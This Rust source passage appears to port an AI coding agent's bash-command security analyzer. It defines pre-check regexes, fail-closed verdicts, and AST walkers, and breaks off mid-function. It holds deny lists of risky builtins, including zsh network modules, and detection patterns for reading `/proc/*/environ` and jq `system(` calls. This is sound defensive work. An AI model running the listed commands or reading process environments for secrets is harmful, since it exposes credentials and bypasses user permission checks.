//! Tree-sitter AST bash-security analyzer — port of claude-code
//! `src/utils/bash/ast.ts` `parseForSecurity` / `parseForSecurityFromAst`.
//! Compiled only under the `bash-ast` feature.
//!
//! claude parses a bash command with tree-sitter and, when the parse succeeds,
//! extracts a flat list of simple commands for per-command permission matching
//! ([`ParseForSecurityResult::Simple`]); commands using a shell feature it
//! can't statically analyze are [`ParseForSecurityResult::TooComplex`] (→ ask);
//! when the parser is unavailable it returns [`ParseForSecurityResult::ParseUnavailable`]
//! (→ the legacy regex battery in [`crate::bash_security`]). `bashPermissions.ts`
//! routes these three verdicts (the legacy battery the port currently runs for
//! EVERY command is, in claude, only the `parse-unavailable` fallback).
//!
//! ## Incremental port status
//! PIECE 2a (this module's first commit): the verdict types + the PRE-CHECK gate
//! ([`pre_check_too_complex`], the regex differentials `parseForSecurityFromAst`
//! runs BEFORE trusting tree-sitter) + the [`parse_for_security`] skeleton. The
//! AST → simple-command extraction (`walkProgram` / `collectCommands` /
//! `walkCommand` / …, ~2000 lines of `ast.ts`) is NOT ported yet: until it is,
//! [`parse_for_security`] returns [`ParseForSecurityResult::ParseUnavailable`]
//! for any command that passes the pre-checks, so the caller keeps the legacy
//! battery (no behavior change — and the whole module is `bash-ast`-gated OFF by
//! default). Later pieces replace that stand-in with the real extraction and
//! wire the verdict into the permission decision.

use regex::Regex;
use std::collections::HashMap;
use std::sync::OnceLock;
use tree_sitter::Node;

/// One redirect on a simple command (TS `Redirect`, `ast.ts:25`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Redirect {
    /// Redirect operator (`>`, `>>`, `<`, `<<`, `>&`, `>|`, `<&`, `&>`, `&>>`, `<<<`).
    pub op: String,
    /// Redirect target (filename / fd / herestring body).
    pub target: String,
    /// Optional leading file descriptor (`2>` → `fd: Some(2)`).
    pub fd: Option<i64>,
}

/// A flattened simple command (TS `SimpleCommand`, `ast.ts:31`).
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct SimpleCommand {
    /// `argv[0]` is the command name; the rest are arguments with quotes resolved.
    pub argv: Vec<String>,
    /// Leading `VAR=val` assignments, in order.
    pub env_vars: Vec<(String, String)>,
    /// Output/input redirects.
    pub redirects: Vec<Redirect>,
    /// Original source span for this command (UI display).
    pub text: String,
}

/// Verdict of [`parse_for_security`] (TS `ParseForSecurityResult`, `ast.ts:42`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ParseForSecurityResult {
    /// Statically analyzable — the flat list of simple commands.
    Simple {
        /// The extracted simple commands (empty for an empty command).
        commands: Vec<SimpleCommand>,
    },
    /// Uses a shell feature we can't statically analyze → the caller must ask.
    TooComplex {
        /// Human-readable reason (byte-faithful to the TS `reason`).
        reason: String,
    },
    /// tree-sitter parse unavailable → the caller falls back to the legacy
    /// regex battery ([`crate::bash_security::bash_command_is_safe`]).
    ParseUnavailable,
}

// ── Pre-check regexes (TS `ast.ts:254-314`): tree-sitter/bash differentials
// detected on the RAW command before trusting tree-sitter's tokenization. ──

macro_rules! lazy_re {
    ($name:ident, $pat:expr) => {
        // `dead_code`: some regexes are consumed only by later port layers
        // (walker / semantic clusters); they are defined here so all const
        // patterns live together.
        #[allow(dead_code)]
        fn $name() -> &'static Regex {
            static RE: OnceLock<Regex> = OnceLock::new();
            RE.get_or_init(|| Regex::new($pat).expect("valid pre-check regex"))
        }
    };
}

// CONTROL_CHAR_RE: control chars bash drops but that confuse static analysis.
lazy_re!(control_char_re, r"[\x00-\x08\x0B-\x1F\x7F]");
// UNICODE_WHITESPACE_RE: invisible Unicode whitespace bash treats as a word char.
lazy_re!(
    unicode_whitespace_re,
    r"[\u{00A0}\u{1680}\u{2000}-\u{200B}\u{2028}\u{2029}\u{202F}\u{205F}\u{3000}\u{FEFF}]"
);
// BACKSLASH_WHITESPACE_RE: `\ `/`\t`, or `\<NL>` adjacent to a non-ws char.
lazy_re!(backslash_whitespace_re, r"\\[ \t]|[^ \t\n\\]\\\n");
// ZSH_TILDE_BRACKET_RE: zsh `~[name]` dynamic named-directory expansion.
lazy_re!(zsh_tilde_bracket_re, r"~\[");
// ZSH_EQUALS_EXPANSION_RE: word-initial `=cmd` zsh EQUALS expansion.
lazy_re!(zsh_equals_expansion_re, r"(?:^|[\s;&|])=[a-zA-Z_]");
// BRACE_WITH_QUOTE_RE: `{` + quote char (brace-expansion obfuscation), run on
// the brace-masked command so quoted JSON like `'{"k":"v"}'` doesn't trip it.
lazy_re!(brace_with_quote_re, r#"\{[^}]*['"]"#);

// ────────────────────────────────────────────────────────────────────────────
// L1: const sets + leaf helpers.
//
// Faithful 1:1 port of the `ast.ts` const sets (54-314, 2060-2204) and the leaf
// helpers (`containsAnyPlaceholder`, `stripRawString`, `tooComplex`,
// `resolveSimpleExpansion`, `applyVarToScope`, `nodeTypeId`). The walker clusters
// (`walkProgram`/`collectCommands`/…) consume these; they land in later layers,
// so [`parse_for_security`]'s stand-in is unchanged in this layer.
//
// `#[allow(dead_code)]` is set on the items the walkers will consume — they are
// not referenced yet in this layer (the parser stand-in is untouched).
// ────────────────────────────────────────────────────────────────────────────

// ── Placeholders (ast.ts:74,82) ──

/// Placeholder for a recursively-extracted `$()` in the outer argv (ast.ts:74).
const CMDSUB_PLACEHOLDER: &str = "__CMDSUB_OUTPUT__";
/// Placeholder for a `$VAR` reference to a tracked non-literal value (ast.ts:82).
const VAR_PLACEHOLDER: &str = "__TRACKED_VAR__";

// ── Structural / separator node-type sets (ast.ts:54,65,186,224) ──

/// Node types that nest commands (TS `STRUCTURAL_TYPES`, ast.ts:54).
#[allow(dead_code)]
pub(crate) const STRUCTURAL_TYPES: &[&str] =
    &["program", "list", "pipeline", "redirected_statement"];

/// Command-separator leaf tokens (TS `SEPARATOR_TYPES`, ast.ts:65). The final
/// member is a literal newline.
#[allow(dead_code)]
pub(crate) const SEPARATOR_TYPES: &[&str] = &["&&", "||", "|", ";", "&", "|&", "\n"];

/// Node types that mean "cannot be statically analyzed" (TS `DANGEROUS_TYPES`,
/// ast.ts:186). ORDER MATTERS: [`node_type_id`] indexes into it (TS
/// `DANGEROUS_TYPE_IDS = [...DANGEROUS_TYPES]`). Membership via `.contains`.
pub(crate) const DANGEROUS_TYPES: &[&str] = &[
    "command_substitution",
    "process_substitution",
    "expansion",
    "simple_expansion",
    "brace_expression",
    "subshell",
    "compound_statement",
    "for_statement",
    "while_statement",
    "until_statement",
    "if_statement",
    "case_statement",
    "function_definition",
    "test_command",
    "ansi_c_string",
    "translated_string",
    "herestring_redirect",
    "heredoc_redirect",
];

/// Redirect operator tokens, kind == canonical op (TS `REDIRECT_OPS`, ast.ts:224).
/// `<<` is NOT a member (heredocs go via the heredoc walker).
#[allow(dead_code)]
pub(crate) const REDIRECT_OPS: &[&str] =
    &[">", ">>", "<", ">&", "<&", ">|", "&>", "&>>", "<<<"];

// ── Variable-resolution sets (ast.ts:125,167) ──

/// Bash-set env vars whose value is shell-controlled (TS `SAFE_ENV_VARS`,
/// ast.ts:125). Resolvable to [`VAR_PLACEHOLDER`] only INSIDE strings.
pub(crate) const SAFE_ENV_VARS: &[&str] = &[
    "HOME",
    "PWD",
    "OLDPWD",
    "USER",
    "LOGNAME",
    "SHELL",
    "PATH",
    "HOSTNAME",
    "UID",
    "EUID",
    "PPID",
    "RANDOM",
    "SECONDS",
    "LINENO",
    "TMPDIR",
    "BASH_VERSION",
    "BASHPID",
    "SHLVL",
    "HISTFILE",
    "IFS",
];

/// Special shell vars (`$?`, `$$`, …) (TS `SPECIAL_VAR_NAMES`, ast.ts:167).
/// Deliberately EXCLUDES `@` and `*` (positional params are empty in a fresh
/// BashTool shell; a placeholder would lie).
pub(crate) const SPECIAL_VAR_NAMES: &[&str] = &["?", "$", "!", "#", "0", "-"];

// ── checkSemantics tail sets (ast.ts:2060-2204) — consumed by the semantic
// cluster (later layer); defined here so all const sets live in one place. ──

/// Zsh module builtins, catchable only by name (TS `ZSH_DANGEROUS_BUILTINS`,
/// ast.ts:2060).
pub(crate) const ZSH_DANGEROUS_BUILTINS: &[&str] = &[
    "zmodload", "emulate", "sysopen", "sysread", "syswrite", "sysseek", "zpty", "ztcp", "zsocket",
    "zf_rm", "zf_mv", "zf_ln", "zf_chmod", "zf_chown", "zf_mkdir", "zf_rmdir", "zf_chgrp", "repeat",
    "foreach", "zcompile", "setopt", "unsetopt", "disable", "shopt",
];

/// Builtins that evaluate their arguments as shell code (TS `EVAL_LIKE_BUILTINS`,
/// ast.ts checkSemantics `k1n`). NOTE: `command`/`builtin`/`noglob` are NOT here —
/// the 2.1.195 binary strips them as command-prefix WRAPPERS (see
/// [`check_semantics`] wrapper loop), so by the time the name battery runs they
/// have already been unwrapped to the real command.
pub(crate) const EVAL_LIKE_BUILTINS: &[&str] = &[
    "eval", "source", ".", "exec", "nocorrect", "fc", "coproc", "trap", "enable", "mapfile",
    "readarray", "hash", "bind", "complete", "compgen", "alias", "let",
];

/// Builtins whose argument IS run as a command — `watch rm -rf`, `flock f rm`,
/// etc. (TS checkSemantics `C$t`). Denied when they carry any operand.
pub(crate) const RUNS_ARG_COMMANDS: &[&str] = &[
    "watch", "ionice", "chrt", "setsid", "taskset", "strace", "ltrace", "script", "flock",
    "unshare", "nsenter",
];

/// Declare-family + zsh assignment builtins whose operands are scrutinised for
/// flags/subscripts that change assignment-eval semantics (TS checkSemantics
/// `w$t`).
pub(crate) const DECLARE_FAMILY: &[&str] = &[
    "declare", "typeset", "local", "export", "readonly", "print", "getopts", "set", "zparseopts",
    "zformat", "zstyle", "autoload", "shift", "exit", "return", "break", "continue", "bye",
    "logout", "vared", "private", "getln", "zregexparse", "float", "integer",
];

/// zsh `typeset`-family subset whose flags trigger matheval of the RHS (TS
/// checkSemantics `_ra`).
pub(crate) const ZSH_TYPESET_FAMILY: &[&str] = &[
    "declare", "typeset", "local", "export", "readonly", "private", "float", "integer",
];

/// `set -o <name>` option names that are statically safe (TS checkSemantics
/// `poo`). Compared after lowercasing and stripping `_`/`-`.
pub(crate) const SET_O_SAFE: &[&str] = &[
    "pipefail", "errexit", "nounset", "xtrace", "noglob", "noclobber", "verbose", "monitor",
    "notify", "vi", "emacs", "errtrace", "functrace", "hashall", "physical", "ignoreeof",
];

/// `set -<letter>` single-letter options that are statically safe (TS
/// checkSemantics `moo`).
pub(crate) const SET_SAFE_LETTERS: &[&str] = &[
    "e", "u", "x", "f", "C", "v", "m", "b", "E", "T", "h", "P", "n",
];

/// `find` primaries that execute commands or modify files (TS checkSemantics
/// `coo`). Auto-allow via a `Bash(find:*)` prefix rule is unsafe with any of these.
pub(crate) const FIND_ACTION_FLAGS: &[&str] = &[
    "-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprint0", "-fprintf", "-fls",
    "-files0-from",
];

/// `find` primaries that take a value operand (skip the operand; TS checkSemantics
/// `R$t`). `-newerXY` is matched by [`find_newer_re`] instead.
pub(crate) const FIND_VALUE_FLAGS: &[&str] = &[
    "-name", "-iname", "-path", "-ipath", "-lname", "-ilname", "-regex", "-iregex", "-wholename",
    "-iwholename", "-samefile", "-newer", "-anewer", "-cnewer", "-mnewer", "-perm", "-user",
    "-group", "-uid", "-gid", "-size", "-type", "-xtype", "-fstype", "-inum", "-links", "-used",
    "-context", "-amin", "-cmin", "-mmin", "-atime", "-ctime", "-mtime", "-mindepth", "-maxdepth",
    "-printf", "-regextype", "-D", "-f", "-flags", "-Bnewer", "-Btime", "-Bmin", "-files0-from",
    "-xattrname",
];

/// `read` flags that consume a NUMERIC value operand (TS checkSemantics `yra`).
pub(crate) const READ_NUMERIC_DATA_FLAGS: &[&str] = &["-t", "-n", "-N"];

/// Builtins → NAME-operand flags that evaluate array subscripts (TS
/// `SUBSCRIPT_EVAL_FLAGS` / `uoo`). Value-vecs are insertion-ordered (the
/// matched flag is interpolated into the reason string).
pub(crate) const SUBSCRIPT_EVAL_FLAGS: &[(&str, &[&str])] = &[
    ("test", &["-v", "-R", "-t"]),
    ("[", &["-v", "-R", "-t"]),
    ("[[", &["-v", "-R", "-t"]),
    ("printf", &["-v"]),
    ("read", &["-a"]),
    ("unset", &["-v"]),
    ("wait", &["-p"]),
];

/// `[[ … ]]` arithmetic comparison operators (TS `TEST_ARITH_CMP_OPS`,
/// ast.ts:2169).
pub(crate) const TEST_ARITH_CMP_OPS: &[&str] = &["-eq", "-ne", "-lt", "-le", "-gt", "-ge"];

/// Builtins taking a bare NAME operand that may contain a subscript (TS
/// `BARE_SUBSCRIPT_NAME_BUILTINS`, ast.ts:2182).
pub(crate) const BARE_SUBSCRIPT_NAME_BUILTINS: &[&str] = &["read", "unset"];

/// `read` flags that consume the next token as data (TS `READ_DATA_FLAGS`,
/// ast.ts:2189).
pub(crate) const READ_DATA_FLAGS: &[&str] = &["-p", "-d", "-n", "-N", "-t", "-u", "-i"];

/// Shell reserved keywords (TS `SHELL_KEYWORDS`, `bashParser.ts:87`). A keyword
/// as `argv[0]` means a tree-sitter mis-parse — never a legitimate command name.
pub(crate) const SHELL_KEYWORDS: &[&str] = &[
    "if", "then", "elif", "else", "fi", "while", "until", "for", "in", "do", "done", "case",
    "esac", "function", "select",
];

// ── Regexes specific to L1 (others already exist in the foundation) ──

// BARE_VAR_UNSAFE_RE (ast.ts:110): space, tab, newline, *, ?, [. JS allows a
// bare `[` in a char class; Rust `regex` requires `\[`.
lazy_re!(bare_var_unsafe_re, r"[ \t\n*?\[]");

// BRACE_EXPANSION_RE (ast.ts:245): {a,b} or {a..b}. (Consumed by walker layers.)
lazy_re!(brace_expansion_re, r"\{[^{}\s]*(,|\.\.)[^{}\s]*\}");
// PROC_ENVIRON_RE (ast.ts:2197): `.*` (procfs resolves `..`), NOT `[^/]*`.
lazy_re!(proc_environ_re, r"/proc/.*/environ");
// NEWLINE_HASH_RE (ast.ts:2204): newline, then 0+ space/tab, then `#`.
lazy_re!(newline_hash_re, "\n[ \t]*#");

// ── checkSemantics wrapper-strip regexes (ast.ts:113-115, 2243-2304) ──
// STDBUF_SHORT_SEP_RE (ast.ts:113): `-i`/`-o`/`-e` (value in next arg).
lazy_re!(stdbuf_short_sep_re, r"^-[ioe]$");
// STDBUF_SHORT_FUSED_RE (ast.ts:114): `-o0` (value fused into the flag arg).
lazy_re!(stdbuf_short_fused_re, r"^-[ioe].");
// STDBUF_LONG_RE (ast.ts:115): `--output=MODE` long form.
lazy_re!(stdbuf_long_re, r"^--(input|output|error)=");
// timeout long flag with fused value (ast.ts:2243): `--kill-after=N`/`--signal=SIG`.
lazy_re!(timeout_long_value_re, r"^--(?:kill-after|signal)=[A-Za-z0-9_.+-]+$");
// timeout signal/duration value charset (ast.ts:2248,2263): allowlisted value.
lazy_re!(timeout_value_re, r"^[A-Za-z0-9_.+-]+$");
// timeout fused short flag with value (ast.ts:2266): `-k5`/`-sTERM`.
lazy_re!(timeout_ks_fused_re, r"^-[ks][A-Za-z0-9_.+-]+$");
// timeout duration (ast.ts:2279): `5`, `5s`, `5.5`, optional `[smhd]` suffix.
lazy_re!(timeout_duration_re, r"^\d+(?:\.\d+)?[smhd]?$");
// nice `-n N` value / legacy `-N` (ast.ts:2300,2302): signed / negative integer.
lazy_re!(nice_n_value_re, r"^-?\d+$");
lazy_re!(nice_legacy_re, r"^-\d+$");
// nice argument carrying an expansion (ast.ts:2304): `$`, `(`, or backtick.
lazy_re!(nice_expansion_re, r"[$(`]");
// jq dangerous flags (2.1.195 checkSemantics): combined `-nf`/`-rf` (any letters
// then f/L) plus the long forms. WIDER than the older `-[fL]`-prefix form.
lazy_re!(
    jq_dangerous_flags_re,
    r"^(?:-[A-Za-z]*[fL]|--(?:from-file|rawfile|slurpfile|library-path)(?:$|=))"
);
// jq filter containing an include/import directive (2.1.195): module loading.
lazy_re!(jq_include_re, r"\b(?:include|import)\b");
// fc short-opt containing `e`/`s` (2.1.195 `^[+-].*[es]`): re-execute / editor.
lazy_re!(fc_exec_re, r"^[+-].*[es]");
// compgen short-opt containing C/F/W (2.1.195 `^[+-].*[CFW]`): exec / func / word-expand.
lazy_re!(compgen_exec_re, r"^[+-].*[CFW]");

// ── checkSemantics superset regexes (2.1.195 binary `checkSemantics`/`Mra`) ──
// Nqe — bash arithmetic-context numeric literal (hex / base#n / decimal).
lazy_re!(numeric_arith_re, r"^-?(0[xX][0-9a-fA-F]+|[0-9]+#[0-9a-zA-Z]+|[0-9]+)$");
// Tra — `read` numeric value operand (decimal / float).
lazy_re!(read_numeric_re, r"^(?:[0-9]+(?:\.[0-9]+)?|\.[0-9]+)$");
// Wrp — argv element that is a subscripted NAME (`arr[…`).
lazy_re!(subscripted_name_re, r"^[A-Za-z_][A-Za-z0-9_]*\[");
// ident followed by `[` anywhere — a subscripted identifier inside an operand.
lazy_re!(ident_subscript_re, r"[A-Za-z_][A-Za-z0-9_]*\[");
// declare/typeset/local flag changing assignment eval: -…[niaAEF].
lazy_re!(declare_niaAEF_re, r"^[+-].*[niaAEF]");
// zsh typeset matheval flag: -…[iEF].
lazy_re!(declare_iEF_re, r"^[+-].*[iEF]");
// declare/export/readonly/private pattern-assign flag: -…m / +…m.
lazy_re!(declare_m_re, r"^[+-].*m");
// zsh typeset tied-pair flag: -…T / +…T.
lazy_re!(declare_T_re, r"^[+-].*T");
// array-subscript operand that also carries an expansion (`[` + `$`/backtick).
lazy_re!(subscript_expansion_re, r"[$`]");
// leading `+`/`-` (float/integer operand with an explicit sign is benign).
lazy_re!(leading_sign_re, r"^[+-]");
// print `-P` prompt-expansion flag (`^[+-].*P`).
lazy_re!(print_p_flag_re, r"^[+-].*P");
// command substitution or backtick in an operand (`$(` or backtick).
lazy_re!(cmdsub_or_backtick_re, r"\$\(|`");
// jobs `-x` (executes its argument): `^[+-].*x`.
lazy_re!(jobs_x_re, r"^[+-].*x");
// `set` token begins with `-` or `+`.
lazy_re!(set_flag_re, r"^[-+]");
// find argument carrying a glob metacharacter (`[`, `]`, `*`, `?`).
lazy_re!(find_glob_re, r"[\[\]*?]");
// find `-newerXY` value-taking primary.
lazy_re!(find_newer_re, r"^-newer[aBcm][aBcmt]$");
// command-wrapper `command -pvV` allowed flags.
lazy_re!(command_pvv_re, r"^-[pvV]+$");

// ── L2 regexes (ast.ts:1659, 1773, 1835, 1894-1896) ──

// ARITH_LEAF_RE (ast.ts:1659): safe leaf tokens inside `$((…))` — VERBATIM,
// anchored. Numeric literals + operator/paren tokens only; a bare variable_name
// leaf is rejected (arithmetic injection). The alternation members `[`/`]` are
// escaped for the Rust `regex` char-class (`\[`/`\]`).
lazy_re!(
    arith_leaf_re,
    r"^(?:[0-9]+|0[xX][0-9a-fA-F]+|[0-9]+#[0-9a-zA-Z]+|[-+*/%^&|~!<>=?:(),]+|<<|>>|\*\*|&&|\|\||[<>=!]=|\$\(\(|\)\))$"
);
// jq `system(` detector inside extractSafeCatHeredoc (ast.ts:1773): `/\bsystem\s*\(/`.
lazy_re!(jq_system_re, r"\bsystem\s*\(");
// Valid bash variable name (ast.ts:1835): `[A-Za-z_][A-Za-z0-9_]*`, anchored.
lazy_re!(valid_var_name_re, r"^[A-Za-z_][A-Za-z0-9_]*$");
// PS4 `${IDENT}` reference, stripped before the charset check (ast.ts:1896).
lazy_re!(ps4_dollar_brace_re, r"\$\{[A-Za-z_][A-Za-z0-9_]*\}");
// PS4 safe charset after stripping `${VAR}` refs (ast.ts:1895): A-Za-z0-9, space,
// `_ + : . / =`, `[`, `]`, and `-` (trailing → literal). `[`/`]` escaped for Rust.
lazy_re!(ps4_charset_re, r"^[A-Za-z0-9 _+:./=\[\]-]*$");
// declare/typeset/local flag that changes assignment semantics: -…[niaA]
// (nameref / integer / array), ast.ts:627.
lazy_re!(declare_flag_re, r"^-[a-zA-Z]*[niaA]");
// declare bare positional with an array subscript (`x[…]`), ast.ts:647.
lazy_re!(declare_subscript_re, r"^[^=]*\[");
// A `$<ident>` in node.text — a resolved simple_expansion (ast.ts:1350).
lazy_re!(dollar_ident_re, r"\$[A-Za-z_]");
// Chars that force shell-escape when rebuilding .text from argv (ast.ts:1353).
// Backtick, brackets and the metacharacter set; `[`/`]` escaped for Rust.
lazy_re!(shell_escape_re, "[\"'\\\\ \t\n$`;|&<>(){}*?\\[\\]~#]");

// ── Leaf helpers (ast.ts:94, 213, 2029, 2033, 1937, 2017) ──

/// TS `containsAnyPlaceholder` (ast.ts:94). SUBSTRING check (not equality) — a
/// composite like `prefix__CMDSUB_OUTPUT__` is non-literal.
#[must_use]
pub(crate) fn contains_any_placeholder(value: &str) -> bool {
    value.contains(CMDSUB_PLACEHOLDER) || value.contains(VAR_PLACEHOLDER)
}

/// TS `nodeTypeId` (ast.ts:213). Analytics-only (no security effect). `None` →
/// `-2` (pre-check); `"ERROR"` → `-1`; a [`DANGEROUS_TYPES`] member → its
/// insertion index + 1; anything else → `0`.
#[must_use]
pub fn node_type_id(node_type: Option<&str>) -> i32 {
    match node_type {
        None => -2,
        Some("ERROR") => -1,
        Some(nt) => DANGEROUS_TYPES
            .iter()
            .position(|t| *t == nt)
            .map_or(0, |i| i as i32 + 1),
    }
}

/// TS `stripRawString` (ast.ts:2029): drop the surrounding quotes of a
/// `raw_string` (`'…'`). JS `text.slice(1,-1)` strips first+last code unit; the
/// quotes are ASCII so we strip first+last CHAR (panic-free for odd input).
#[must_use]
#[allow(dead_code)]
pub(crate) fn strip_raw_string(text: &str) -> String {
    let mut c = text.chars();
    c.next();
    c.next_back();
    c.as_str().to_string()
}

/// TS `tooComplex` (ast.ts:2033). Builds the fail-closed verdict from a node.
/// The TS variant also carries `nodeType` (analytics-only); the ported enum has
/// only `reason`, so it is dropped. Reason strings are byte-faithful.
#[must_use]
#[allow(dead_code)]
pub(crate) fn too_complex(node: Node) -> ParseForSecurityResult {
    let t = node.kind();
    let reason = if t == "ERROR" {
        "Parse error".to_string()
    } else if DANGEROUS_TYPES.contains(&t) {
        format!("Contains {t}")
    } else {
        format!("Unhandled node type: {t}")
    };
    ParseForSecurityResult::TooComplex { reason }
}

/// TS `resolveSimpleExpansion` (ast.ts:1937). Resolve a `simple_expansion`
/// (`$VAR`) node against `var_scope`. `Ok(s)` = the resolved value (the real
/// literal for tracked literals, [`VAR_PLACEHOLDER`] for shell-controlled vars);
/// `Err(TooComplex)` = fail-closed. The bare-vs-`inside_string` asymmetry is the
/// core invariant (see the inline SECURITY notes in `ast.ts`).
#[allow(dead_code)]
pub(crate) fn resolve_simple_expansion(
    node: Node,
    src: &[u8],
    var_scope: &HashMap<String, String>,
    inside_string: bool,
) -> Result<String, ParseForSecurityResult> {
    let mut var_name: Option<String> = None;
    let mut is_special = false;
    let mut cursor = node.walk();
    for c in node.children(&mut cursor) {
        if c.kind() == "variable_name" {
            var_name = Some(c.utf8_text(src).unwrap_or("").to_string());
            break;
        }
        if c.kind() == "special_variable_name" {
            var_name = Some(c.utf8_text(src).unwrap_or("").to_string());
            is_special = true;
            break;
        }
    }
    let var_name = match var_name {
        Some(v) => v,
        None => return Err(too_complex(node)),
    };
    if let Some(tv) = var_scope.get(&var_name) {
        if contains_any_placeholder(tv) {
            // Non-literal: bare → reject, inside string → VAR_PLACEHOLDER.
            if !inside_string {
                return Err(too_complex(node));
            }
            return Ok(VAR_PLACEHOLDER.to_string());
        }
        // Pure literal — return it directly so downstream path validation sees
        // the REAL value. Bare args additionally reject empty / IFS+glob chars.
        if !inside_string {
            if tv.is_empty() {
                return Err(too_complex(node));
            }
            if bare_var_unsafe_re().is_match(tv) {
                return Err(too_complex(node));
            }
        }
        return Ok(tv.clone());
    }
    // Untracked: SAFE_ENV_VARS / special+positional vars resolvable only inside
    // strings (value is shell-controlled).
    if inside_string {
        if SAFE_ENV_VARS.contains(&var_name.as_str()) {
            return Ok(VAR_PLACEHOLDER.to_string());
        }
        if is_special
            && (SPECIAL_VAR_NAMES.contains(&var_name.as_str())
                || (!var_name.is_empty() && var_name.bytes().all(|b| b.is_ascii_digit())))
        {
            return Ok(VAR_PLACEHOLDER.to_string());
        }
    }
    Err(too_complex(node))
}

/// TS `applyVarToScope` (ast.ts:2017). Apply a `name=value` (or `+=` append) to
/// `var_scope`. If the combined value contains any placeholder it is stored as
/// [`VAR_PLACEHOLDER`] so a later `$name` correctly rejects as a bare arg.
#[allow(dead_code)]
pub(crate) fn apply_var_to_scope(
    var_scope: &mut HashMap<String, String>,
    name: &str,
    value: &str,
    is_append: bool,
) {
    let existing = var_scope.get(name).cloned().unwrap_or_default();
    let combined = if is_append {
        format!("{existing}{value}")
    } else {
        value.to_string()
    };
    let stored = if contains_any_placeholder(&combined) {
        VAR_PLACEHOLDER.to_string()
    } else {
        combined
    };
    var_scope.insert(name.to_string(), stored);
}

// ────────────────────────────────────────────────────────────────────────────
// L2: arg / value / assignment / heredoc walkers.
//
// Faithful 1:1 port of `ast.ts` walkArgument (1399), walkString (1508),
// walkArithmetic (1675), collectCommandSubstitution (1374),
// walkVariableAssignment (1777), extractSafeCatHeredoc (1721),
// walkHeredocRedirect (1143), walkHerestringRedirect (1211), walkTestExpr (962).
//
// Return convention mirrors the TS unions:
//   TS `string | ParseForSecurityResult`        → `Result<String, ParseForSecurityResult>`
//   TS `ParseForSecurityResult | null`          → `Option<ParseForSecurityResult>` (None = ok)
//   TS `string | 'DANGEROUS' | null`            → [`CatHeredoc`]
//   TS `{name,value,isAppend} | result`         → `Result<VarAssign, ParseForSecurityResult>`
//
// tree-sitter `Node` has no `.text`; `src: &[u8]` is threaded through every
// walker and node text read via `node.utf8_text(src).unwrap_or("")` (the
// pre-checks already rejected control / Unicode-ws, so invalid-UTF-8 is treated
// as "" defensively). `collect_commands` (the L3 statement-driver) is a DEP; a
// fail-closed stand-in is provided below until L3 lands.
// ────────────────────────────────────────────────────────────────────────────

/// TS `node.text` — the node's source span. utf8 failure (pre-checks already ran)
/// is treated as `""` defensively.
#[allow(dead_code)]
fn node_text<'a>(node: Node, src: &'a [u8]) -> &'a str {
    node.utf8_text(src).unwrap_or("")
}

/// Iterate ALL children of `node` (named + anonymous tokens), matching TS
/// `node.children`. One cursor per node (tree-sitter requirement).
#[allow(dead_code)]
fn children(node: Node<'_>) -> Vec<Node<'_>> {
    let mut cursor = node.walk();
    node.children(&mut cursor).collect()
}

/// A leading `name=value` / `name+=value` assignment (TS
/// `{name,value,isAppend}`, ast.ts:1781 return shape).
#[derive(Debug, Clone, PartialEq, Eq)]
#[allow(dead_code)]
pub(crate) struct VarAssign {
    /// Variable name (validated `[A-Za-z_][A-Za-z0-9_]*`).
    pub name: String,
    /// Resolved value (literal, or a placeholder for cmdsub/unknown-var values).
    pub value: String,
    /// `+=` append (vs `=` set).
    pub is_append: bool,
}

/// TS `extractSafeCatHeredoc` return (ast.ts:1721) `string | 'DANGEROUS' | null`.
#[derive(Debug, Clone, PartialEq, Eq)]
#[allow(dead_code)]
pub(crate) enum CatHeredoc {
    /// The heredoc body (a safe `$(cat <<'EOF' … EOF)` static result).
    Body(String),
    /// Body matched a dangerous pattern (`/proc/*/environ` or jq `system(`).
    Dangerous,
    /// Not a safe cat-heredoc shape (caller falls through to general `$()`).
    None,
}

/// TS `collectCommands` (ast.ts:482). Recursively collect leaf `command` nodes
/// from a structural wrapper node. `None` = success; `Some(err)` = fail-closed
/// on a disallowed node type. Mirrors the varScope-snapshot semantics: `&&`/`;`
/// carry scope linearly; `||`/`|`/`|&`/`&` reset to the entry snapshot; pipelines
/// run on a COPY so stages never mutate the caller's scope. Any unhandled node
/// type falls to the default `too_complex` (over-ask), NEVER silently succeeds.
#[allow(dead_code)]
pub(crate) fn collect_commands(
    node: Node,
    commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
    src: &[u8],
) -> Option<ParseForSecurityResult> {
    let kind = node.kind();

    if kind == "command" {
        // Pass `commands` as the innerCommands accumulator — any $() extracted
        // during walk_command gets appended alongside the outer command.
        match walk_command(node, &[], commands, var_scope, src) {
            ParseForSecurityResult::Simple { commands: cs } => {
                commands.extend(cs);
                return None;
            }
            other => return Some(other),
        }
    }

    if kind == "redirected_statement" {
        return walk_redirected_statement(node, commands, var_scope, src);
    }

    if kind == "comment" {
        return None;
    }

    if STRUCTURAL_TYPES.contains(&kind) {
        // SECURITY: `||`, `|`, `|&`, `&` must NOT carry varScope linearly (see
        // ast.ts:504 for the flag-omission attack). Snapshot the incoming scope;
        // reset to it after those separators. `&&`/`;` DO carry scope.
        let is_pipeline = kind == "pipeline";
        let mut needs_snapshot = false;
        if !is_pipeline {
            for c in children(node) {
                if c.kind() == "||" || c.kind() == "&" {
                    needs_snapshot = true;
                    break;
                }
            }
        }
        let snapshot: Option<HashMap<String, String>> =
            if needs_snapshot { Some(var_scope.clone()) } else { None };
        // For `pipeline`, ALL stages run in subshells → start with a COPY so
        // nothing mutates the caller's scope. For `list`/`program`, the `&&`/`;`
        // chain mutates the caller's scope; fork only on `||`/`&`.
        let mut owned_scope: Option<HashMap<String, String>> =
            if is_pipeline { Some(var_scope.clone()) } else { None };
        for child in children(node) {
            let ck = child.kind();
            if SEPARATOR_TYPES.contains(&ck) {
                if ck == "||" || ck == "|" || ck == "|&" || ck == "&" {
                    // `|`/`|&` only appear under `pipeline`; `||`/`&` under list.
                    let base = snapshot.as_ref().unwrap_or(&*var_scope);
                    owned_scope = Some(base.clone());
                }
                continue;
            }
            let scope: &mut HashMap<String, String> =
                owned_scope.as_mut().unwrap_or(var_scope);
            if let Some(err) = collect_commands(child, commands, scope, src) {
                return Some(err);
            }
        }
        return None;
    }

    if kind == "negated_command" {
        // `! cmd` inverts exit code only. Recurse into the wrapped command.
        for child in children(node) {
            if child.kind() == "!" {
                continue;
            }
            return collect_commands(child, commands, var_scope, src);
        }
        return None;
    }

    if kind == "declaration_command" {
